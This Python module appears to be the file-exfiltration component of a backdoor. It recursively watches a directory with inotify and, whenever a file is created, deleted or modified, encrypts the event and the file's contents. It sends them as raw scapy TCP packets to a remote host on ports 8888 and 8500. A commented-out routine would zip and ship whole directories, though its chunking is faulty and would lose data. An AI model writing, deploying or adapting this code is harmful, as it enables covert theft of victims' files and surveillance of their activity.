import pyinotify
from scapy.all import *
from datetime import datetime
import shutil
import encryption


global host_addr


class EventHandler(pyinotify.ProcessEvent):
    def process_IN_CREATE(self, event):
        if "swp" in event.name:
            return

        self.send_notif("Created", event.pathname)
        self.send_file(event.pathname, event.name)

    def process_IN_DELETE(self, event):
        if "swp" in event.name:
            return

        self.send_notif("Deleted", event.pathname)

    def process_IN_CLOSE_WRITE(self, event):
        if "swp" in event.name:
            return

        self.send_notif("Modified", event.pathname)
        self.send_file(event.pathname, event.name)
        #self.create_zip(event.path)

    def send_notif(self, action, data):
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        msg = f"[{current_time}] {action}: {data}"

        encrypted_msg = encryption.encrypt_data(msg.encode("utf-8"))
        encrypted_msg += b"$NOTIF"

        pkt = IP(dst=host_addr)/TCP(sport=RandShort(), dport=8888)/encrypted_msg

        send(pkt, verbose=False)

    def send_file(self, path, filename):
        with open(path) as file:
            data = file.read()

        encrypted_data = encryption.encrypt_data(data.encode("utf-8"))
        encrypted_data = encrypted_data + b"$EOF" + bytes(filename, encoding="utf-8")

        pkt = IP(dst=host_addr)/TCP(sport=RandShort(), dport=8500)/encrypted_data

        send(pkt, verbose=False)
        time.sleep(0.1)

    # def create_zip(self, directory):
    #     directory_split = directory.split("/")
    #     directory_name = directory_split[-1]
    #     output_name = f"/tmp/{directory_name}"

    #     shutil.make_archive(output_name, "zip", directory)

    #     self.send_zip(f"{output_name}.zip")

    # def send_zip(self, zip_filename):
    #     with open(zip_filename, "rb") as zip_file:
    #         data = zip_file.read()

    #     data_chunks = [data[i:i+1000] for i in range(0, len(data), 1500)]
    #     data_chunks[-1] += (b"$EOF" + b"zip")

    #     for data_chunk in data_chunks:
    #         pkt = IP(dst=host_addr)/TCP(sport=RandShort(), dport=8500)/data_chunk
    #         send(pkt, verbose=False)
    #         time.sleep(0.5)

def start_watchdir(dirname, host_ip):
    global host_addr
    host_addr = host_ip

    watch_manager = pyinotify.WatchManager()
    mask = pyinotify.IN_CREATE | pyinotify.IN_DELETE | pyinotify.IN_CLOSE_WRITE

    notifier = pyinotify.ThreadedNotifier(watch_manager, EventHandler())
    watch_manager.add_watch(dirname, mask, rec=True)

    notifier.start()
